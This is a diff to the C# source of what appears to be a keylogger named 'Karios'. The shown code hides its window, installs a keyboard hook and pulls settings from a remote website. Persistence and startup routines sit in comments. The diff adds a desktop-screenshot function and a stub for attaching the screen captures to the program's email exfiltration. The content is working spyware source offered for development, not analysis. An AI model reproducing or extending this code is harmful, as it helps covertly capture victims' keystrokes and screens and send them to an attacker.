@@ -12,6 +12,8 @@ using System.Net.Mail;
 using Microsoft.Win32;
 using System.Windows.Input;
 using System.Net.Sockets;
+using System.Drawing.Imaging;
+using System.Drawing;
 
 namespace Karios
 {
@@ -35,16 +37,21 @@ namespace Karios
                 {
                     string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html"); // get rid of this cancerous website Sam -- STBoyden
                     if (!webData.ToUpperInvariant().Contains("Keyonline"))
+
                     // Hide the window
                     ShowWindow(handle, SW_HIDE);
+
                     // Persitance feature
                     //Duplicate(); 
+
                     // Run on startup 
                     //SetStartup();
                     // Start Application
                     _hookID = SetHook(_proc);
                     Application.Run();  
                     UnhookWindowsHookEx(_hookID);
+
+
                     if (!webData.ToUpperInvariant().Contains("ip:"))
                     {
                         string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfgqwertyuiopasdf";
@@ -80,6 +87,10 @@ namespace Karios
                     if (!webData.ToUpperInvariant().Contains("Website"))
                     {
                         // Activate website launcher
+                    }
+                    if (!webData.ToUpperInvariant().Contains("Capture = true"))
+                    {
+                        // Activates screen capturerer & adds it to the email function
                     }
                 }
                 catch { }
@@ -250,6 +261,18 @@ namespace Karios
                 }
                 catch { }
             }
+        }
+
+        
+
+        private static Image CaptureDesktop()
+        {
+            Rectangle rectangle = default(Rectangle);
+            rectangle = Screen.PrimaryScreen.Bounds;
+            Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
+            Graphics graphics = Graphics.FromImage(bitmap);
+            graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
+            return bitmap;
         }
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
